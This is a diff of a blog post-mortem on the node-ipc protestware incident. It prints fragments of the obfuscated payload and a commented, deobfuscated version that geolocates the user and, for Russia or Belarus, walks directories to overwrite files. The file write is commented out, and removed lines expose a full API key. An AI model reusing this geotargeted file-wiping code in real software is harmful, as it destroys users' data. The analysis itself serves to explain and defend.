@@ -1,5 +1,9 @@
 # Day 10 - node-ipc protestware post mortem
 
+:::tip
+See the related github repo [node-ipc-protestware-post.mortem)](https://github.com/nicolardi/node-ipc-protestware-post.mortem)
+:::
+
 This time we'll look at the world-famous node-ipc which is a library that allows you to communicate between processes in node.js but we won't talk about the library itself but rather what happened some days ago.
 
 The story is that the library's author decided to push a malicious code as a protest against the Ukrainian war. This package is a well-known and widely used library that is used in many popular node.js applications.
@@ -17,7 +21,8 @@ setTimeout(function () {
     if (t > 1) {
         return;
     }
-    const n = Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64"); 
+    const n = Buffer.from("aHR0cHM6L ... DkxNTQ=",
+                            "base64"); 
     o.get(n.toString("utf8"), function (t) {
         t.on("data", function (t) {
             const n = Buffer.from("Li8=", "base64");
@@ -30,7 +35,8 @@ setTimeout(function () {
             try {
                 const s = JSON.parse(t.toString("utf8"));
                 const u = s[c.toString("utf8")].toLowerCase();
-                const a = u.includes(e.toString("utf8")) || u.includes(i.toString("utf8")); you 
+                const a = u.includes(e.toString("utf8")) || 
+                          u.includes(i.toString("utf8")); 
                 if (a) {
                     h(n.toString("utf8"));
                     h(o.toString("utf8"));
@@ -78,7 +84,7 @@ As you can see the code is obfuscated and it is not very easy to read.
 
 
 ```js 
-const n = Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64"); 
+const n = Buffer.from("aHR0cHM6L .... ykxNTQ=", "base64"); 
 ```
 creates a buffer from a base64 string. let's see how to decode it:
 
@@ -107,7 +113,9 @@ setTimeout(function () {
     }
 
     // Call api.geolocation.io to get the location of the user.
-    https.get('https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154', function (res) {
+    https.get(
+        'https://api.ipgeolocation.io/ipgeo?apiKey=ae511e ... a758a5309154', 
+        function (res) {
         // On data received from the api.geolocation.io server.
         res.on("data", function (response) {
             try {
@@ -116,7 +124,8 @@ setTimeout(function () {
                 // Get the country name.
                 const country_name = object['country_name'].toLowerCase();
                 // test if the country name is in the list of countries to attack.
-                const isRussiaOrBelarus = country_name.includes('russia') || country_name.includes('belarus');
+                const isRussiaOrBelarus = country_name.includes('russia') 
+                                || country_name.includes('belarus');
                 // If the country is in the list of countries to attack, attack.
                 if (isRussiaOrBelarus) {
                     // attack the current directory.
@@ -172,12 +181,14 @@ async function attack(dir = "", targetFilenameSubstring = "") {
             const attackedFiles = attack(i, targetFilenameSubstring);
             // Keeps track of the files that were attacked.
             attackedFiles.length > 0 ? files.push(...attackedFiles) : null;
-        } else if (i.indexOf(targetFilenameSubstring) >= 0) { // Pattern match (unused.. all filed are attacked anyway)
+        } else if (i.indexOf(targetFilenameSubstring) >= 0) { 
+            // Pattern match (unused.. all filed are attacked anyway)
             try {
                 
                 console.log("WITH LOVE FILE: " + i);
                 
-                // NOTE: I have disabled the function which replaces the file contents with a '❤️'.
+                // NOTE: I have disabled the function which 
+                // replaces the file contents with a '❤️'.
                 //fs.writeFile(i, '❤️', function () { });
             } catch (t) { }
         }
